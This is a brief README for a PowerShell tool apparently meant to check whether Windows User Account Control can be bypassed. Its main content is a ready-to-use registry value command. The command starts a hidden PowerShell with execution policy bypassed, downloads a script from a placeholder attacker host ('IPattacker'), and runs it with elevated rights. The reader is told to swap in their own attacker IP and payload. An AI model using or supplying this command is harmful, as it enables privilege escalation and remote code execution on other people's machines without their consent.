# UAC-Bypass-Checker
This is a Powershell script made to check if you can bypass UAC.

----------IMPORTANT----------

Change the CHANGETHIS username to your actual username LINE 17 & LINE 21

You can use the following command to download and execute a powershell script as an administrator bypassinc UAC (change the attacker IP & script.ps1 for what you need).

```
$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadString('http://IPattacker/script.ps1'); Invoke-Function"
```
